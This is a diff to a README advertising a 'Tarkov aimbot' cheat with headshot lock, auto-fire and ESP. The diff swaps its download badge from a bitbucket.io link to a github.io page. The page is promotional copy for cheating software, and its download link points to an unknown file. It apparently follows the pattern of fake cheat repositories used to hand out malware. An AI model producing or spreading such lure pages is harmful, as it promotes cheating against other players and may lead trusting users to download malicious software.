@@ -2,7 +2,7 @@
 
 **Can’t win a gunfight? Tired of losing to rats and campers with meta guns? A Tarkov aimbot flips that struggle into total dominance. With headshot lock, auto-fire, and ESP syncing, every click = kill.**
 
-[![Download Aimbot](https://img.shields.io/badge/Download-Aimbot-blueviolet)](https://fileoffload19.bitbucket.io)
+[![Download Aimbot](https://img.shields.io/badge/Download-Aimbot-blueviolet)](https://Tarkov-Aimbot-zavix.github.io/.github)
 ---
 
 ## 🎯 What is a Tarkov Aimbot?
